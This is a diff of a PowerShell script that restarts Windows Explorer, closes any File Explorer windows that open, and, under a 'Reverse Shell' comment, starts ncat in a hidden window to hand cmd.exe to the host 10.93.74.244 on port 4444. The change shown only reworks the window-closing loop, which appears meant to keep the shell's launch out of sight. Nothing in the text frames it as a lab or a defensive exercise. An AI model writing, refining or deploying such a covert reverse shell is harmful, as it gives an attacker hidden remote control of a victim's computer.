@@ -69,21 +69,21 @@ Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer
 Stop-Process -Name explorer -Force
 Start-Process explorer.exe
 
+# Wait for Explorer windows and close them if they pop up
+Start-Sleep -Milliseconds 500
+for ($i=0; $i -lt 10; $i++) {
+    $hwnds = @(New-Object -ComObject Shell.Application).Windows() | Where-Object { $_.Name -like "*File Explorer*" }
+    foreach ($w in $hwnds) { $w.Quit() }
+    Start-Sleep -Milliseconds 200
+}
+
 #Reverse Shell
 Set-Location $env:USERPROFILE
 $Ncat = "C:\Program Files (x86)\Nmap\ncat.exe"
 Start-Process -FilePath $Ncat -ArgumentList "10.93.74.244 4444 -e cmd.exe" -WindowStyle Hidden
 
 
-Start-Sleep -Milliseconds 200
-# Close any Explorer windows that opened automatically
-Get-Process explorer | ForEach-Object {
-    # Minimize / close windows except the shell itself
-    $hwnds = @(New-Object -ComObject Shell.Application).Windows() | Where-Object { $_.Name -like "*File Explorer*" }
-    foreach ($w in $hwnds) {
-        $w.Quit()
-    }
-}
+
 
 
 
